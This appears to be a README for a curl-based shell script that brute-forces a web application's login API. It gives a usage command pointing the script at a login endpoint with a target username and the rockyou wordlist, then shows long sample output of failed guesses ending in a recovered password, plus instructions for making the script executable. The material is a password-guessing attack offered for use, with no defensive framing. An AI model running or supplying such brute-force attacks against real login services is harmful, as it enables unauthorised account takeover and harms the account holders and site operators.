# Simple brute force script using curl with automation


Example

./login-bruteforce.sh -u "http://secb/api/Auth/Login" -U "adomin@ssrd.io" -P /usr/share/wordlists/rockyou.txt

output:
    Failed login with Username: adomin@ssrd.io Password: tigger (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: sunshine (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: chocolate (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: password1 (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: soccer (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: anthony (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: friends (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: butterfly (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: purple (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: angel (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: jordan (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: liverpool (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: justin (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: loveme (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: fuckyou (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: 123123 (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: football (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: secret (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: andrea (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: carlos (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: jennifer (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: joshua (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: bubbles (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: 1234567890 (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: superman (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: hannah (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: amanda (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: loveyou (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: pretty (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: basketball (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: andrew (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: angels (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: tweety (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: flower (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: playboy (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: hello (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: elizabeth (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: hottie (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: tinkerbell (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: charlie (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: samantha (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: barbie (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: chelsea (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: lovers (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: teamo (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: jasmine (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: brandon (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: 666666 (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: shadow (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: melissa (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: eminem (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: matthew (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: robert (HTTP status: 400)
    Success! Username: adomin@ssrd.io Password: snailmail
    Failed login with Username: adomin@ssrd.io Password: eminem (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: matthew (HTTP status: 400)
    Failed login with Username: adomin@ssrd.io Password: robert (HTTP status: 400)

# Dont forget to chmod u+x the script before using

# then run the script with ./login-bruteforce.sh